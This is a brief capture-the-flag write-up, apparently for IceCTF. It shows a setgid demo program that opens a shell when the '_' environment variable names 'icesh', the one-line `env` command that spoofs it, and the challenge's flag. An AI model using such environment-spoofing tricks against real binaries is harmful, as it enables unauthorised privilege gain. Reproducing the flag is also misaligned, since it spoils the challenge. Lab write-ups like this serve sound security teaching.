ls showed 4 files.<br>
Using: cat demo.c showed this
```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <libgen.h>
#include <string.h>

void give_shell() {
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    if(strncmp(basename(getenv("_")), "icesh", 6) == 0){
        give_shell();
    }
    else {
        printf("I'm sorry, your free trial has ended.\n");
    }
    return 0;
}
```
So, we needed to change an environment variable. Quick google search showed we can change it using env for running of a particular program<br>
env _="icesh" ./demo gives the shell<br>
Then simply: cat flag.txt <br>
<b>IceCTF{wH0_WoU1d_3vr_7Ru5t_4rgV}</b>
